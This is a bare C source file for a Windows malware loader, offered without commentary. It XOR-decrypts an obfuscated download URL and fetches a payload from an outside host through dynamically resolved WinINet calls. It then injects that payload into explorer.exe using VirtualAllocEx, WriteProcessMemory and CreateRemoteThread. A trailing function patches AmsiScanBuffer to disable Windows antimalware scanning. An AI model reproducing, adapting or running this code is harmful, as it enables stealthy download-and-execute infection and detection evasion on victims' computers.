#include <windows.h>
#include <wininet.h>
#pragma comment(lib, "wininet.lib")
#include <stdio.h>
#include <tlhelp32.h>

// Decrypt XOR
void xor_decrypt(char* data, int length) {
    for (int i = 0; i < length; i++) {
        data[i] ^= 0xAA;
    }
}

// Manual API resolver
FARPROC GetApiAddress(LPCSTR module, LPCSTR function) {
    HMODULE hMod = LoadLibraryA(module);
    if (!hMod) return NULL;
    return GetProcAddress(hMod, function);
}

// Find target process (explorer.exe)
DWORD FindTargetProcess() {
    PROCESSENTRY32 pe;
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    pe.dwSize = sizeof(PROCESSENTRY32);
    if (Process32First(snapshot, &pe)) {
        do {
            if (lstrcmpi(pe.szExeFile, "explorer.exe") == 0) {
                CloseHandle(snapshot);
                return pe.th32ProcessID;
            }
        } while (Process32Next(snapshot, &pe));
    }
    CloseHandle(snapshot);
    return 0;
}

int main() {
    char url[] = "ÂÞÞÚ……ÃÚÜž„ÎÅÝÄÆÅËÎ„ÞÂÃÄÁÈØÅËÎÈËÄÎ„ÉÅÇ…Ÿçè„ÐÃÚ";
    xor_decrypt(url, strlen(url));

    HINTERNET (WINAPI *pInternetOpenA)(LPCSTR, DWORD, LPCSTR, LPCSTR, DWORD) = (HINTERNET (WINAPI *)(LPCSTR, DWORD, LPCSTR, LPCSTR, DWORD)) GetApiAddress("wininet.dll", "InternetOpenA");
    HINTERNET (WINAPI *pInternetOpenUrlA)(HINTERNET, LPCSTR, LPCSTR, DWORD, DWORD, DWORD_PTR) = (HINTERNET (WINAPI *)(HINTERNET, LPCSTR, LPCSTR, DWORD, DWORD, DWORD_PTR)) GetApiAddress("wininet.dll", "InternetOpenUrlA");
    BOOL (WINAPI *pInternetReadFile)(HINTERNET, LPVOID, DWORD, LPDWORD) = (BOOL (WINAPI *)(HINTERNET, LPVOID, DWORD, LPDWORD)) GetApiAddress("wininet.dll", "InternetReadFile");
    BOOL (WINAPI *pInternetCloseHandle)(HINTERNET) = (BOOL (WINAPI *)(HINTERNET)) GetApiAddress("wininet.dll", "InternetCloseHandle");

    HINTERNET hInternet = pInternetOpenA("", 0, NULL, NULL, 0);
    HINTERNET hFile = pInternetOpenUrlA(hInternet, url, NULL, 0, 0, 0);

    BYTE buffer[4096];
    DWORD bytesRead;
    HANDLE hHeap = GetProcessHeap();
    LPVOID pPayload = HeapAlloc(hHeap, 0, 1);
    SIZE_T payloadSize = 0;

    while (pInternetReadFile(hFile, buffer, sizeof(buffer), &bytesRead) && bytesRead != 0) {
        pPayload = HeapReAlloc(hHeap, 0, pPayload, payloadSize + bytesRead);
        memcpy((LPBYTE)pPayload + payloadSize, buffer, bytesRead);
        payloadSize += bytesRead;
    }

    pInternetCloseHandle(hFile);
    pInternetCloseHandle(hInternet);

    DWORD pid = FindTargetProcess();
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    LPVOID remoteBuffer = VirtualAllocEx(hProcess, NULL, payloadSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(hProcess, remoteBuffer, pPayload, payloadSize, NULL);
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);

    CloseHandle(hThread);
    CloseHandle(hProcess);
    HeapFree(hHeap, 0, pPayload);

    return 0;
}
// AMSI Bypass
void amsi_bypass() {
    HMODULE hAmsi = LoadLibraryA("amsi.dll");
    if (hAmsi) {
        FARPROC pAmsiScanBuffer = GetProcAddress(hAmsi, "AmsiScanBuffer");
        if (pAmsiScanBuffer) {
            DWORD oldProtect;
            VirtualProtect(pAmsiScanBuffer, sizeof(void*), PAGE_EXECUTE_READWRITE, &oldProtect);
            *(void**)pAmsiScanBuffer = NULL;
            VirtualProtect(pAmsiScanBuffer, sizeof(void*), oldProtect, &oldProtect);
        }
    }
}
